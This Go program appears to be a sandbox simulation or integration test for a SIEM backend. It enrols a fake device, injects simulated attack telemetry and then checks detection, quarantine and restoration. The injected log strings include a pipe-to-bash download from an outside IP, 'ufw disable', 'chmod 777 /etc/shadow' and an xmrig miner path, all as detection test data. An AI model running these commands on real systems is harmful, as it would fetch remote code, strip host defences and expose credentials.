package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/sentinel/siem-backend/internal/models"
)

const (
	Cyan   = "\033[96m"
	Green  = "\033[92m"
	Yellow = "\033[93m"
	Red    = "\033[91m"
	Bold   = "\033[1m"
	Dim    = "\033[2m"
	Reset  = "\033[0m"
)

func banner() {
	fmt.Printf(`
%s%s========================================================================
   🛡️  SENTINEL GO SIEM — FULL SANDBOX ATTACK & DEFENSE SIMULATION  🛡️
========================================================================%s
`, Cyan, Bold, Reset)
}

func stepHeader(num int, title string) {
	fmt.Printf("\n%s%s[STEP %d] %s%s\n", Cyan, Bold, num, title, Reset)
	fmt.Printf("%s%s%s\n", Dim, strings.Repeat("-", 70), Reset)
}

type Client struct {
	BaseURL    string
	HTTPClient *http.Client
}

func (c *Client) Post(path string, body interface{}, token string) (*http.Response, []byte) {
	var bodyReader io.Reader
	if body != nil {
		b, _ := json.Marshal(body)
		bodyReader = bytes.NewReader(b)
	}

	url := fmt.Sprintf("%s%s", c.BaseURL, path)
	req, _ := http.NewRequest("POST", url, bodyReader)
	req.Header.Set("Content-Type", "application/json")
	if token != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
	}

	resp, err := c.HTTPClient.Do(req)
	if err != nil {
		log.Fatalf("[-] Request failed to %s: %v", url, err)
	}
	defer resp.Body.Close()

	data, _ := io.ReadAll(resp.Body)
	return resp, data
}

func (c *Client) Get(path string, token string) (*http.Response, []byte) {
	url := fmt.Sprintf("%s%s", c.BaseURL, path)
	req, _ := http.NewRequest("GET", url, nil)
	if token != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
	}

	resp, err := c.HTTPClient.Do(req)
	if err != nil {
		log.Fatalf("[-] Request failed to %s: %v", url, err)
	}
	defer resp.Body.Close()

	data, _ := io.ReadAll(resp.Body)
	return resp, data
}

func (c *Client) Delete(path string, token string) (*http.Response, []byte) {
	url := fmt.Sprintf("%s%s", c.BaseURL, path)
	req, _ := http.NewRequest("DELETE", url, nil)
	if token != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
	}

	resp, err := c.HTTPClient.Do(req)
	if err != nil {
		log.Fatalf("[-] Request failed to %s: %v", url, err)
	}
	defer resp.Body.Close()

	data, _ := io.ReadAll(resp.Body)
	return resp, data
}

func main() {
	banner()

	baseURL := "http://127.0.0.1:8000"
	if len(os.Args) > 1 {
		baseURL = os.Args[1]
	}

	client := &Client{
		BaseURL:    baseURL,
		HTTPClient: &http.Client{Timeout: 10 * time.Second},
	}

	// STEP 1: IAM Authentication
	stepHeader(1, "IAM Authentication & Admin Session Minting")
	resp, data := client.Post("/api/v1/auth/login", map[string]string{
		"username": "admin",
		"password": "admin",
	}, "")
	if resp.StatusCode != http.StatusOK {
		log.Fatalf("Admin login failed (HTTP %d): %s", resp.StatusCode, string(data))
	}
	var tokenRes models.TokenResponse
	_ = json.Unmarshal(data, &tokenRes)
	adminToken := tokenRes.AccessToken
	fmt.Printf(" %s✓%s Admin authenticated successfully.\n", Green, Reset)
	fmt.Printf("   %sJWT Bearer Token issued (TTL: 60m)%s\n", Dim, Reset)

	resp, data = client.Get("/api/v1/auth/me", adminToken)
	var meRes models.UserResponse
	_ = json.Unmarshal(data, &meRes)
	fmt.Printf(" %s✓%s User Profile: Username=%s | Role=%s\n", Green, Reset, meRes.Username, meRes.Role)

	// Register Operator
	analystUser := fmt.Sprintf("soc_analyst_%d", time.Now().Unix()%10000)
	resp, _ = client.Post("/api/v1/auth/register", models.RegisterRequest{
		Username: analystUser,
		Password: "Password123!",
		Role:     "analyst",
	}, "")
	if resp.StatusCode != http.StatusCreated {
		log.Fatalf("Operator registration failed: %d", resp.StatusCode)
	}
	fmt.Printf(" %s✓%s Operator registration verified: %s%s%s (Role: analyst)\n", Green, Reset, Cyan, analystUser, Reset)

	// STEP 2: Fleet Enrollment
	stepHeader(2, "Fleet Enrollment Token Minting & Device Registration")
	resp, data = client.Post("/api/v1/enrollment/token?reusable=true&days_valid=14", nil, adminToken)
	var tokenGenRes map[string]interface{}
	_ = json.Unmarshal(data, &tokenGenRes)
	enrollToken := tokenGenRes["token"].(string)
	fmt.Printf(" %s✓%s Generated Enrollment Token: %s%s%s\n", Green, Reset, Yellow, enrollToken, Reset)

	targetHost := "FINANCE-STATION-01"
	targetIP := "192.168.10.88"
	targetMAC := "52:54:00:88:99:AA"

	resp, data = client.Post("/api/v1/enrollment/register", models.DeviceRegistrationRequest{
		Token:        enrollToken,
		Hostname:     targetHost,
		OS:           "linux",
		MACAddress:   targetMAC,
		IPAddress:    targetIP,
		AgentVersion: "2.0.0-go-native",
	}, "")
	if resp.StatusCode != http.StatusOK {
		log.Fatalf("Device registration failed (HTTP %d): %s", resp.StatusCode, string(data))
	}
	var devRegRes models.DeviceRegistrationResponse
	_ = json.Unmarshal(data, &devRegRes)
	deviceID := devRegRes.DeviceID
	devToken := devRegRes.DeviceCredential
	fmt.Printf(" %s✓%s Device Registered: ID=%s%s%s | Hostname=%s (%s)\n", Green, Reset, Cyan, deviceID, Reset, targetHost, targetIP)
	fmt.Printf("   %sDevice mutual authentication credential established.%s\n", Dim, Reset)

	// STEP 3: Baseline Telemetry
	stepHeader(3, "Ingesting Baseline Telemetry & Normal Process Snapshots")
	now := time.Now().UTC()
	resp, _ = client.Post("/api/v1/agent/heartbeat", models.HeartbeatRequest{
		DeviceID:  deviceID,
		Timestamp: now.Format(time.RFC3339),
		Status:    "online",
	}, devToken)
	if resp.StatusCode != http.StatusOK {
		log.Fatalf("Heartbeat failed: %d", resp.StatusCode)
	}
	fmt.Printf(" %s✓%s Online Heartbeat received. Device status verified: %sONLINE%s\n", Green, Reset, Green, Reset)

	resp, _ = client.Post("/api/v1/agent/metrics", models.MetricsBatchRequest{
		DeviceID: deviceID,
		Metrics: []models.MetricItem{
			{
				Timestamp:      now.Format(time.RFC3339),
				CPUPercent:     14.2,
				MemoryPercent:  28.5,
				DiskPercent:    38.0,
				NetworkRXBytes: 1024 * 1024,
				NetworkTXBytes: 512 * 1024,
			},
		},
	}, devToken)
	if resp.StatusCode != http.StatusOK {
		log.Fatalf("Metrics ingestion failed: %d", resp.StatusCode)
	}
	fmt.Printf(" %s✓%s Baseline Host Metrics: CPU 14.2%% | Memory 28.5%% | Disk 38.0%%\n", Green, Reset)

	// STEP 4: Network Attack Simulation
	stepHeader(4, "SIMULATING NETWORK ATTACK (External Infiltration & Recon)")
	fmt.Printf(" %s⚡ Executing Attack Vector 1:%s High-Frequency SSH Credential Brute-Force Spray (MITRE T1110)\n", Yellow, Reset)
	sshLogs := make([]models.LogItem, 4)
	for i := 0; i < 4; i++ {
		sshLogs[i] = models.LogItem{
			Timestamp: now.Format(time.RFC3339),
			OS:        "linux",
			Source:    "sshd",
			EventID:   "sshd",
			EventType: "security",
			Severity:  "error",
			Message:   fmt.Sprintf("Failed password for invalid user root from 185.220.101.55 port %d ssh2", 50100+i),
			RawLog:    fmt.Sprintf("sshd[%d]: Failed password for invalid user root from 185.220.101.55", 2000+i),
		}
	}
	client.Post("/api/v1/agent/logs", models.LogsBatchRequest{
		DeviceID: deviceID,
		Logs:     sshLogs,
	}, devToken)
	fmt.Printf("   %s→ 4 consecutive failed logins injected from 185.220.101.55%s\n", Red, Reset)

	fmt.Printf(" %s⚡ Executing Attack Vector 2:%s Network Service Discovery Scanner (MITRE T1046)\n", Yellow, Reset)
	client.Post("/api/v1/agent/processes", models.ProcessesRequest{
		DeviceID: deviceID,
		Processes: []models.Process{
			{PID: 410, Name: "nmap", CPUPercent: 22.0, MemoryPercent: 2.1, Executable: "/usr/bin/nmap -sS -p 1-65535 192.168.10.0/24"},
		},
	}, devToken)
	fmt.Printf("   %s→ Unauthorized nmap SYN port sweep detected in process tree%s\n", Red, Reset)

	fmt.Printf(" %s⚡ Executing Attack Vector 3:%s Network Data Exfiltration Burst (MITRE T1048)\n", Yellow, Reset)
	client.Post("/api/v1/agent/metrics", models.MetricsBatchRequest{
		DeviceID: deviceID,
		Metrics: []models.MetricItem{
			{
				Timestamp:      now.Format(time.RFC3339),
				CPUPercent:     30.0,
				MemoryPercent:  35.0,
				DiskPercent:    38.0,
				NetworkRXBytes: 1024 * 1024,
				NetworkTXBytes: 80 * 1024 * 1024, // 80 MB burst
			},
		},
	}, devToken)
	fmt.Printf("   %s→ 80 MB outbound burst transmitted over alternative protocol%s\n", Red, Reset)

	// STEP 5: Internal Host Attack Simulation
	stepHeader(5, "SIMULATING INTERNAL SYSTEM ATTACK (Host Compromise & Privilege Escalation)")
	fmt.Printf(" %s⚡ Executing Attack Vector 4:%s Sensitive Security File Tampering (MITRE T1548)\n", Yellow, Reset)
	client.Post("/api/v1/agent/logs", models.LogsBatchRequest{
		DeviceID: deviceID,
		Logs: []models.LogItem{
			{
				Timestamp: now.Format(time.RFC3339),
				OS:        "linux",
				Source:    "sudo",
				EventID:   "EXECVE",
				EventType: "security",
				Severity:  "critical",
				Message:   "sudo chmod 777 /etc/shadow executed by compromised web user",
			},
		},
	}, devToken)
	fmt.Printf("   %s→ Unauthorized permission modification on /etc/shadow%s\n", Red, Reset)

	fmt.Printf(" %s⚡ Executing Attack Vector 5:%s Remote Reverse Shell Execution (MITRE T1059)\n", Yellow, Reset)
	client.Post("/api/v1/agent/logs", models.LogsBatchRequest{
		DeviceID: deviceID,
		Logs: []models.LogItem{
			{
				Timestamp: now.Format(time.RFC3339),
				OS:        "linux",
				Source:    "bash",
				EventID:   "REVERSE_SHELL",
				EventType: "security",
				Severity:  "critical",
				Message:   "curl http://194.26.29.112/stage2.sh | bash",
			},
		},
	}, devToken)
	fmt.Printf("   %s→ Piped execution payload spawned interactive shell to remote C2%s\n", Red, Reset)

	fmt.Printf(" %s⚡ Executing Attack Vector 6:%s Defense Evasion / Host Firewall Teardown (MITRE T1562)\n", Yellow, Reset)
	client.Post("/api/v1/agent/logs", models.LogsBatchRequest{
		DeviceID: deviceID,
		Logs: []models.LogItem{
			{
				Timestamp: now.Format(time.RFC3339),
				OS:        "linux",
				Source:    "ufw",
				EventID:   "FIREWALL_STOPPED",
				EventType: "security",
				Severity:  "high",
				Message:   "ufw disable executed; packet filtering disabled",
			},
		},
	}, devToken)
	fmt.Printf("   %s→ Host defense disabled (ufw disable)%s\n", Red, Reset)

	fmt.Printf(" %s⚡ Executing Attack Vector 7:%s Cryptojacking Miner Process & CPU Spike (MITRE T1496)\n", Yellow, Reset)
	client.Post("/api/v1/agent/processes", models.ProcessesRequest{
		DeviceID: deviceID,
		Processes: []models.Process{
			{PID: 666, Name: "xmrig", CPUPercent: 98.5, MemoryPercent: 18.0, Executable: "/tmp/.systemd-private/xmrig"},
		},
	}, devToken)
	fmt.Printf("   %s→ Cryptominer daemon 'xmrig' active at 98.5%% CPU%s\n", Red, Reset)

	// STEP 6: AI Threat Center Real-Time Analysis
	stepHeader(6, "AI SECURITY POSTURE & THREAT CLASSIFICATION RESULTS")
	resp, data = client.Get("/api/v1/anomalies/stats", adminToken)
	var stats map[string]interface{}
	_ = json.Unmarshal(data, &stats)

	fmt.Printf(" %sAI Security Posture:%s %s%s%v%s\n", Bold, Reset, Red, Bold, stats["posture"], Reset)
	fmt.Printf(" %sCalculated Risk Score:%s %s%s%.0f/100%s\n", Bold, Reset, Red, Bold, stats["risk_score"].(float64), Reset)
	fmt.Printf(" %sActive Threats Flagged:%s %s%.0f%s (Critical: %s%.0f%s, High: %s%.0f%s)\n",
		Bold, Reset, Yellow, stats["active_threats"].(float64), Reset,
		Red, stats["critical_threats"].(float64), Reset,
		Yellow, stats["high_threats"].(float64), Reset)

	fmt.Printf("\n %sMITRE ATT&CK Tactic Distribution:%s\n", Bold, Reset)
	if dist, ok := stats["mitre_distribution"].([]interface{}); ok {
		for _, item := range dist {
			m := item.(map[string]interface{})
			fmt.Printf("   • %s: %s%.0f%s detection(s)\n", m["tactic"], Cyan, m["count"].(float64), Reset)
		}
	}

	resp, data = client.Get("/api/v1/anomalies?status=active", adminToken)
	var threatsRes map[string]interface{}
	_ = json.Unmarshal(data, &threatsRes)
	anomalies := threatsRes["anomalies"].([]interface{})

	fmt.Printf("\n %sDetected Incident Log (First 4 Incidents):%s\n", Bold, Reset)
	for i, item := range anomalies {
		if i >= 4 {
			break
		}
		a := item.(map[string]interface{})
		fmt.Printf("   [%s%s%s] [%s%s%s] %s\n", Red, strings.ToUpper(a["severity"].(string)), Reset, Cyan, a["mitre_id"], Reset, a["title"])
		rootCause := a["root_cause"].(string)
		if len(rootCause) > 90 {
			rootCause = rootCause[:90] + "..."
		}
		fmt.Printf("      %sRoot Cause: %s%s\n", Dim, rootCause, Reset)
	}

	// STEP 7: Incident Response — Device Isolation
	stepHeader(7, "INCIDENT RESPONSE: 1-CLICK QUARANTINE & ISOLATION ENFORCEMENT")
	resp, _ = client.Post(fmt.Sprintf("/api/v1/devices/%s/isolate", deviceID), nil, adminToken)
	if resp.StatusCode != http.StatusOK {
		log.Fatalf("Isolation failed: %d", resp.StatusCode)
	}
	fmt.Printf(" %s✓%s Device Isolation Triggered: %s%sSTATUS = ISOLATED%s\n", Green, Reset, Red, Bold, Reset)

	resp, data = client.Get(fmt.Sprintf("/api/v1/devices/%s", deviceID), adminToken)
	var devStat models.Device
	_ = json.Unmarshal(data, &devStat)
	if devStat.Status != "isolated" {
		log.Fatalf("Expected isolated status, got %s", devStat.Status)
	}
	fmt.Printf(" %s✓%s SIEM Fleet Database: Device marked as %sQUARANTINED / ISOLATED%s\n", Green, Reset, Red, Reset)

	fmt.Printf("\n %sVerifying Network Boundary Enforcement (Zero-Trust Severance):%s\n", Bold, Reset)
	// Test heartbeat rejection
	blockedHb, hbData := client.Post("/api/v1/agent/heartbeat", models.HeartbeatRequest{
		DeviceID:  deviceID,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Status:    "online",
	}, devToken)
	fmt.Printf("   Attempt Heartbeat: HTTP %d (%s%s%s)\n", blockedHb.StatusCode, Red, string(hbData), Reset)
	if blockedHb.StatusCode != http.StatusForbidden {
		log.Fatalf("Expected 403 Forbidden on quarantined heartbeat, got %d", blockedHb.StatusCode)
	}

	// Test log stream rejection
	blockedLogs, logData := client.Post("/api/v1/agent/logs", models.LogsBatchRequest{
		DeviceID: deviceID,
		Logs:     sshLogs[:1],
	}, devToken)
	fmt.Printf("   Attempt Log Stream: HTTP %d (%s%s%s)\n", blockedLogs.StatusCode, Red, string(logData), Reset)
	if blockedLogs.StatusCode != http.StatusForbidden {
		log.Fatalf("Expected 403 Forbidden on quarantined logs, got %d", blockedLogs.StatusCode)
	}

	// Test metrics rejection
	blockedMetrics, metData := client.Post("/api/v1/agent/metrics", models.MetricsBatchRequest{
		DeviceID: deviceID,
		Metrics:  []models.MetricItem{},
	}, devToken)
	fmt.Printf("   Attempt Metrics: HTTP %d (%s%s%s)\n", blockedMetrics.StatusCode, Red, string(metData), Reset)
	if blockedMetrics.StatusCode != http.StatusForbidden {
		log.Fatalf("Expected 403 Forbidden on quarantined metrics, got %d", blockedMetrics.StatusCode)
	}
	fmt.Printf(" %s✓%s Boundary verified: All unauthorized endpoint telemetry strictly blocked with HTTP 403.\n", Green, Reset)

	// STEP 8: Threat Remediation & Safe Restoration
	stepHeader(8, "INCIDENT REMEDIATION & SAFE DEVICE RESTORATION")
	for _, item := range anomalies {
		a := item.(map[string]interface{})
		client.Post(fmt.Sprintf("/api/v1/anomalies/%s/resolve", a["_id"].(string)), nil, adminToken)
	}
	fmt.Printf(" %s✓%s All %d active threat anomalies remediated and marked %sRESOLVED%s.\n", Green, Reset, len(anomalies), Green, Reset)

	resp, _ = client.Post(fmt.Sprintf("/api/v1/devices/%s/restore", deviceID), nil, adminToken)
	if resp.StatusCode != http.StatusOK {
		log.Fatalf("Restore failed: %d", resp.StatusCode)
	}
	fmt.Printf(" %s✓%s Device Quarantine Lifted: %s%sSTATUS = ONLINE%s\n", Green, Reset, Green, Bold, Reset)

	resumedHb, _ := client.Post("/api/v1/agent/heartbeat", models.HeartbeatRequest{
		DeviceID:  deviceID,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Status:    "online",
	}, devToken)
	if resumedHb.StatusCode != http.StatusOK {
		log.Fatalf("Resumed heartbeat failed: %d", resumedHb.StatusCode)
	}
	fmt.Printf(" %s✓%s Normal agent communication resumed: HTTP 200 OK.\n", Green, Reset)

	// Clean teardown
	client.Delete(fmt.Sprintf("/api/v1/devices/%s", deviceID), adminToken)
	fmt.Printf(" %s✓%s Sandbox endpoint cleanly dereferenced and purged.\n", Green, Reset)

	fmt.Printf(`
%s%s========================================================================
   🎉 ALL 11 FEATURE SECTORS & ATTACK DEFENSE VECTORS VALIDATED! 🎉
========================================================================%s
`, Green, Bold, Reset)
}
